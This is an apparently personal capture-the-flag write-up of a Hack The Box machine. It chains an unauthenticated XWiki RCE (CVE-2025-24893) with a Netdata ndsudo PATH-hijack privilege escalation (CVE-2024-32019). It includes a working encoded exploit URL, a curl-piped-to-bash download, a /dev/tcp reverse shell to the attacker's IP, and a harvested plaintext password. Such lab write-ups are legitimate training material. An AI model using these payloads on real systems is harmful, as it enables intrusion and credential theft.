---
{"publish":true,"created":"2025-08-16T10:15:21.901+05:30","modified":"2025-08-31T09:42:04.337+05:30","published":"2025-08-31T09:42:04.337+05:30","tags":["easy","enum","CVE"],"cssclasses":"","api":"https://www.hackthebox.com/api/v4/user/achievement/machine/1454964/684"}
---

## Initial Access

How I started my Saturday morning.

```shell
$ nmap 10.10.11.80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 09:38 IST
Nmap scan report for editor.htb (10.10.11.80)
Host is up (0.79s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 9.93 seconds
```

I opened it in the browser but it auto-resolved it as `editor.htb`. So...

```shell
sudo echo "10.10.11.80    editor.htb" >> /etc/hosts
```

I couldn't get any dopamine hits from port 80 so I switched to the other http port.

```shell
$ dirsearch --min-response-size=1 -u http://editor.htb:8080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/laughtersec/Downloads/reports/http_editor.htb_8080/_25-08-09_09-46-17.txt

Target: http://editor.htb:8080/

[09:46:17] Starting:
[09:46:45] 404 -  452B  - /favicon.ico
[09:46:54] 404 -  464B  - /META-INF
[09:46:54] 404 -  479B  - /META-INF/app-config.xml
[09:46:54] 404 -  480B  - /META-INF/application.xml
[09:46:54] 404 -  487B  - /META-INF/application-client.xml
[09:46:54] 404 -  465B  - /META-INF/
[09:46:54] 404 -  472B  - /META-INF/CERT.SF
[09:46:54] 404 -  474B  - /META-INF/beans.xml
[09:46:54] 404 -  478B  - /META-INF/container.xml
[09:46:54] 404 -  476B  - /META-INF/eclipse.inf
[09:46:54] 404 -  476B  - /META-INF/context.xml
[09:46:54] 404 -  478B  - /META-INF/jboss-app.xml
[09:46:54] 404 -  481B  - /META-INF/jboss-client.xml
[09:46:54] 404 -  480B  - /META-INF/ironjacamar.xml
[09:46:54] 404 -  476B  - /META-INF/ejb-jar.xml
[09:46:54] 404 -  485B  - /META-INF/jboss-ejb-client.xml
[09:46:54] 404 -  479B  - /META-INF/jboss-ejb3.xml
[09:46:54] 404 -  495B  - /META-INF/jboss-deployment-structure.xml
[09:46:54] 404 -  486B  - /META-INF/jboss-webservices.xml
[09:46:54] 404 -  482B  - /META-INF/jbosscmp-jdbc.xml
[09:46:54] 404 -  476B  - /META-INF/MANIFEST.MF
[09:46:54] 404 -  501B  - /META-INF/openwebbeans/openwebbeans.properties
[09:46:54] 404 -  476B  - /META-INF/SOFTWARE.SF
[09:46:54] 404 -  495B  - /META-INF/spring/application-context.xml
[09:46:54] 404 -  480B  - /META-INF/persistence.xml
[09:46:54] 404 -  489B  - /META-INF/weblogic-application.xml
[09:46:54] 404 -  485B  - /META-INF/weblogic-ejb-jar.xml
[09:46:54] 404 -  471B  - /META-INF/ra.xml
[09:47:02] 200 -    2KB - /robots.txt
[09:47:12] 404 -  463B  - /WEB-INF
[09:47:12] 404 -  464B  - /WEB-INF/
```

Its been a while since I have come across `robots.txt`. The response code was only too convincing. To my surprise...

```shell
$ curl http://editor.htb:8080/robots.txt
User-agent: *
# Prevent bots from executing all actions except "view" and
# "download" since:
# 1) we don't want bots to execute stuff in the wiki by
#    following links! (for example delete pages, add comments,
#    etc)
# 2) we don't want bots to consume CPU and memory
#   (for example to perform exports)
Disallow: /xwiki/bin/viewattachrev/
Disallow: /xwiki/bin/viewrev/
Disallow: /xwiki/bin/pdf/
Disallow: /xwiki/bin/edit/
Disallow: /xwiki/bin/create/
Disallow: /xwiki/bin/inline/
Disallow: /xwiki/bin/preview/
Disallow: /xwiki/bin/save/
Disallow: /xwiki/bin/saveandcontinue/
Disallow: /xwiki/bin/rollback/
Disallow: /xwiki/bin/deleteversions/
Disallow: /xwiki/bin/cancel/
Disallow: /xwiki/bin/delete/
Disallow: /xwiki/bin/deletespace/
Disallow: /xwiki/bin/undelete/
Disallow: /xwiki/bin/reset/
Disallow: /xwiki/bin/register/
Disallow: /xwiki/bin/propupdate/
Disallow: /xwiki/bin/propadd/
Disallow: /xwiki/bin/propdisable/
Disallow: /xwiki/bin/propenable/
Disallow: /xwiki/bin/propdelete/
Disallow: /xwiki/bin/objectadd/
Disallow: /xwiki/bin/commentadd/
Disallow: /xwiki/bin/commentsave/
Disallow: /xwiki/bin/objectsync/
Disallow: /xwiki/bin/objectremove/
Disallow: /xwiki/bin/attach/
Disallow: /xwiki/bin/upload/
Disallow: /xwiki/bin/temp/
Disallow: /xwiki/bin/downloadrev/
Disallow: /xwiki/bin/dot/
Disallow: /xwiki/bin/delattachment/
Disallow: /xwiki/bin/skin/
Disallow: /xwiki/bin/jsx/
Disallow: /xwiki/bin/ssx/
Disallow: /xwiki/bin/login/
Disallow: /xwiki/bin/loginsubmit/
Disallow: /xwiki/bin/loginerror/
Disallow: /xwiki/bin/logout/
Disallow: /xwiki/bin/lock/
Disallow: /xwiki/bin/redirect/
Disallow: /xwiki/bin/admin/
Disallow: /xwiki/bin/export/
Disallow: /xwiki/bin/import/
Disallow: /xwiki/bin/get/
Disallow: /xwiki/bin/distribution/
Disallow: /xwiki/bin/jcaptcha/
Disallow: /xwiki/bin/unknown/
Disallow: /xwiki/bin/webjars/
```

Went straight for the login page, because why not.

![](Machines/png/editor_xwiki_version.png)

I could've looked for default credentials here but before I did that I noticed the version of XWiki. It turns out that it is vulnerable to CVE-2025-24893.

[CVE-2025-24893 – Unauthenticated Remote Code Execution in XWiki via SolrSearch Macro](https://www.offsec.com/blog/cve-2025-24893/)

A nice write-up from Offensive Security about this vulnerability led me to the [PoC](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py). 

![](Machines/png/editor_payload_decoded.png)

The `exploit` function on line 35 had the principle behind the vulnerability in the `exploit_url` variable. I retrieved the user `oliver` on the machine using the PoC provided but it would be much more comfortable having a shell. I was running commands as the `xwiki` user but because it didn't have a home directory, I couldn't authorize my public key for ssh, and my current user didn't have read or write permissions on oliver's home directory.

Any other direct reverse shell payloads also failed to execute. But what *worked* is a web request back to us using `curl`. Seems like the only way to go forward.

I hosted a webserver with the following bash script `revshell.sh`

```sh
#!/bin/sh

sh -i >& /dev/tcp/10.10.16.8/8080 0>&1
```

The exploit can be modified to curl this script then pipe it to bash, like so:

```python
# Exploit function
def exploit(target_url):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
    exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%5B%22%2Fbin%2Fsh%22%2C%22-c%22%2C%22curl%20http%3A%2F%2F10.10.16.8%2Frevshell.sh%20%7C%20bash%22%5D.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
```

This was the payload we used before URL-encoding to get a reverse shell: `["/bin/sh","-c","curl http://10.10.16.8/revshell.sh | bash"]`

revshell.sh

`python3 -m http.server`

`exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%5B%22%2Fbin%2Fsh%22%2C%22-c%22%2C%22curl%20http%3A%2F%2F{host}%2Frevshell.sh%20%7C%20bash%22%5D.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"`

`exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%5B%22%2Fbin%2Fsh%22%2C%22-c%22%2C%22curl%20http%3A%2F%2F10.10.16.8%2Frevshell.sh%20%7C%20bash%22%5D.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"`

```
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.16.8:8080
[*] Command shell session 2 opened (10.10.16.8:8080 -> 10.10.11.80:57948) at 2025-08-09 14:10:34 +0530


Shell Banner:
sh: 0:
-----

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
xwiki@editor:/usr/lib/xwiki-jetty$
```

`grep -inrE "(?i)\bpassword[\s:]*([A-Za-z0-9]+)" / 2> /dev/null`

```shell
$ pwd 
/usr/lib/xwiki/WEB-INF
```

```shell
$ cat * | grep -i "password"
cat: cache: Is a directory
cat: classes: Is a directory
cat: fonts: Is a directory
cat: lib: Is a directory
cat: observation: Is a directory
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
```

`ssh oliver@editor.htb`

## Privilege Escalation

I admit, this might be a very unconventional way of figuring it out but I did two things here:
- Check groups
- Run `linpeas.sh`

In both these cases, I found a commonality - netdata, which led me to investigate further.

```shell
oliver@editor:~$ groups
oliver netdata
oliver@editor:~$
```

The user oliver belonged to the group "netdata".

```shell
╔══════════╣ Analyzing Redis Files (limit 70)
redis-server Not Found
-rw-r--r-- 1 root root 374 Apr  1  2024 /opt/netdata/usr/lib/netdata/conf.d/go.d/redis.conf
jobs:
  - name: local
    address: 'unix://@/tmp/redis.sock'
  - name: local
    address: 'unix://@/var/run/redis/redis.sock'
  - name: local
    address: 'unix://@/var/lib/redis/redis.sock'
-rw-r--r-- 1 root root 1622 Apr  1  2024 /opt/netdata/usr/lib/netdata/conf.d/health.d/redis.conf
 template: redis_connections_rejected
       on: redis.connections
    class: Errors
     type: KV Storage
component: Redis
   lookup: sum -1m unaligned of rejected
    every: 10s
    units: connections
     warn: $this > 0
  summary: Redis rejected connections
     info: Connections rejected because of maxclients limit in the last minute
    delay: down 5m multiplier 1.5 max 1h
       to: dba
 template: redis_bgsave_broken
       on: redis.bgsave_health
    class: Errors
     type: KV Storage
component: Redis
    every: 10s
     calc: $last_bgsave != nan AND $last_bgsave != 0
     crit: $this
    units: ok/failed
  summary: Redis background save
     info: Status of the last RDB save operation (0: ok, 1: error)
    delay: down 5m multiplier 1.5 max 1h
       to: dba
 template: redis_bgsave_slow
       on: redis.bgsave_now
    class: Latency
     type: KV Storage
component: Redis
    every: 10s
     calc: $current_bgsave_time
     warn: $this > 600
     crit: $this > 1200
    units: seconds
  summary: Redis slow background save
     info: Duration of the on-going RDB save operation
    delay: down 5m multiplier 1.5 max 1h
       to: dba
 template: redis_master_link_down
       on: redis.master_link_down_since_time
    class: Errors
     type: KV Storage
component: Redis
    every: 10s
     calc: $time
    units: seconds
     crit: $this != nan AND $this > 0
  summary: Redis master link down
     info: Time elapsed since the link between master and slave is down
    delay: down 5m multiplier 1.5 max 1h
       to: dba
```

`linpeas.sh` pointed out a directory named "netdata" in `/opt`, indicating that the current user had something to do with it. I searched for "netdata privesc", and I found the following link: [CVE-2024-32019: Understanding Local Privilege Escalation in Netdata](https://ogma.in/cve-2024-32019-understanding-local-privilege-escalation-in-netdata)

It had version information so I verified it.

```shell
oliver@editor:/opt/netdata/bin$ ./netdatacli version
netdata v1.45.2
```

Version affected!

But its good to further verify whether it is mitigated.

```shell
oliver@editor:~$ ls -la /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

It is unmitigated. This is definitely the intended path to privesc.

There was also a PoC on GitHub available.

[AzureADTrent/CVE-2024-32019-POC: POC for netdata ndsudo vulnerability - CVE-2024-32019](https://github.com/AzureADTrent/CVE-2024-32019-POC)

After carefully reading the GitHub repo, I understood:
- `ndsudo` is a utility bundled with netdata.
- `ndsudo` has SUID bit set (as seen when checking for mitigation)
- `ndsudo` looks for the `nvme` binary in `$PATH`.

So we need to
- Find where `ndsudo` is (its not anywhere in `$PATH`).
- Compile and place `nvme` anywhere in `$PATH`.
- Trigger `nvme` as seen in the PoC

Find `ndsudo`
```shell
oliver@editor:~$ find / -name ndsudo 2> /dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

Set path, because none of the directories in the current `$PATH` are writable.
```bash
oliver@editor:~$ PATH=/tmp:$PATH
```

Place `nvme` in `$PATH`
```shell
laughtersec@localmachine$ wget https://raw.githubusercontent.com/AzureADTrent/CVE-2024-32019-POC/refs/heads/main/poc.c && gcc poc.c -o nvme && scp nvme oliver@editor.htb:/tmp/nvme
```

Trigger `nvme` via `ndsudo`
```shell
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/home/oliver# cat /root/root.txt
```

And scene.

## Post-solving observations

I could've looked for `ndsudo` by searching for SUID binaries too, which belongs to the netdata group.

```shell
oliver@editor:~$ find / -perm -4000 -exec ls -la {} \; 2> /dev/null
-rwsr-x--- 1 root netdata 965056 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
-rwsr-x--- 1 root netdata 1377624 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
-rwsr-x--- 1 root netdata 1144224 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata 81472 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ioping
-rwsr-x--- 1 root netdata 896448 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
-rwsr-x--- 1 root netdata 4261672 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```